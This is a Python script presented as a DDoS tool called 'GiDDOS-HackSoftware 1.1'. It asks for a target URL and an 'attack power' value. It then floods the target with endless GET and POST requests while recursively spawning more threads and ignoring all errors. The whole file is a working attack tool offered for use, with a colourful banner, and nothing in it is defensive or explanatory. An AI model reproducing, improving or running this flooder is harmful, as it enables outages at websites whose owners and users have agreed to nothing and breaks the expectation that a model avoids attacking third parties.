import requests
import threading
import time
from colorama import init
from colorama import Fore, Back, Style
from threading import Thread
init()

print ( Fore.GREEN + "Product version 1.1 ")
print ( Fore.YELLOW + "■□■□■" + Fore.GREEN + " GiDDOS-HackSoftware 1.1 ║ BY TUSSA AND ALEXAGEN " + Fore.YELLOW + "■□■□■" + Fore.GREEN )
print()
print ( "    _____ _ _____  _____   ____   _____  " + Fore.RED + "V.1.1" + Fore.GREEN )   
print ( "   / ____(_)  __ \|  __ \ / __ \ / ____| " ) 
print ( "  | |  __ _| |  | | |  | | |  | | (___   " ) 
print ( "  | | |_ | | |  | | |  | | |  | |\___ \  " )
print ( "  | |__| | | |__| | |__| | |__| |____) | " )
print ( "   \_____|_|_____/|_____/ \____/|_____/  " )
print ()
print ()
url = None
thrnom = None
url = input( "Url ( example: https:\\\example.com ) ► " )
try:
    requests.get(url)
except requests.exceptions.InvalidURL:
    print( Fore.RED + "ERROR: URL " + "'" + str(url) + "'" + " not exist!" + Fore.GREEN )
    print( Fore.RED + "WARNING: Program will turn after 5 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 4 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 3 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 2 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 1 seconds" + Fore.GREEN )
    time.sleep(1)
    exit()


except requests.exceptions.MissingSchema:
    print( Fore.RED + "ERROR: URL " + "'" + str(url) + "'" + " not exist!" + Fore.GREEN )
    print( Fore.RED + "WARNING: Program will turn after 5 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 4 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 3 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 2 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 1 seconds" + Fore.GREEN )
    time.sleep(1)
    exit()


except requests.exceptions.ConnectionError:
    print( Fore.RED + "ERROR: URL " + "'" + str(url) + "'" + " not exist!" + Fore.GREEN )
    print( Fore.RED + "WARNING: Program will turn after 5 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 4 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 3 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 2 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 1 seconds" + Fore.GREEN )
    time.sleep(1)
    exit()


if not url.__contains__("http"):
    print( Fore.RED + "ERROR: Invalid domain" + Fore.GREEN )
    print( Fore.RED + "WARNING: Program will turn after 5 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 4 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 3 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 2 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 1 seconds" + Fore.GREEN )
    time.sleep(1)
    exit()
	

elif not url.__contains__("."):
    print( Fore.RED + "ERROR: Invalid domain" + Fore.GREEN )
    print( Fore.RED + "WARNING: Program will turn after 5 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 4 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 3 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 2 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 1 seconds" + Fore.GREEN )
    time.sleep(1)
    exit()


thrnom = input( "DDOS Atack Power ( example: 1000 ) ► " )
if thrnom == "0":
    print( Fore.RED + "ERROR: Power count is incorrect!" + Fore.GREEN )
    print( Fore.RED + "WARNING: Program will turn after 5 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 4 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 3 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 2 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 1 seconds" + Fore.GREEN )
    time.sleep(1)
    exit()


elif thrnom == "":
    print( Fore.RED + "ERROR: Power count is incorrect!" + Fore.GREEN )
    print( Fore.RED + "WARNING: Program will turn after 5 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 4 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 3 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 2 seconds" + Fore.GREEN )
    time.sleep(1)
    print( Fore.RED + "WARNING: Program will turn after 1 seconds" + Fore.GREEN )
    time.sleep(1)
    exit()


def ddos():
	while(1<10):
		try:
			spam = requests.post(url)
			spam2 = requests.get(url)
			for i in range(int(thrnom)):
				thr = Thread(target = ddos)
				thr.start()
				url_check_status = requests.get(url)

				print("DDOS Atack is running! URL status code: " + str(url_check_status))
		except MemoryError:
			continue
		except RuntimeError:
			continue
		except requests.exceptions.ContentDecodingError:
			continue
		except requests.exceptions.SSLError:
			continue
		except ssl.SSLError:
			continue
		except NameError:
			continue
		except Exception:
			continue
		except TypeError:
			continue
ddos()





